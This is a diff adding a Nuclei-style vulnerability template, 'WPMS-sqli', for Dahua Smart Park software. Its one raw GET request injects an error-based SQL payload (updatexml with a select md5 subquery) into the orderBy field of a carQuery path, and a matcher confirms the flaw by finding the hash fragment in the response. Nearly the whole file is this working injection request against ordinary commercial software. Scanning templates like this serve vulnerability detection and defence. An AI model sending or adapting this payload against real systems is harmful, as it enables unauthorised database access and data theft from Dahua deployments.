@@ -1,0 +1,28 @@
+id: WPMS-sqli
+
+info:
+  name: 大华智慧园区sql注入漏洞
+  author: Str1am
+  severity: high
+  tags: dahua
+
+requests:
+  - raw:
+      - |
+        GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20md5(10086)),0x7e),1)--"%7D/extend/%7B%7D HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Encoding:gzip,deflate
+        Content-Length: 3
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "6412121cbb2dc2cb9e460cfee7046be"
+        part: body
+        condition: and
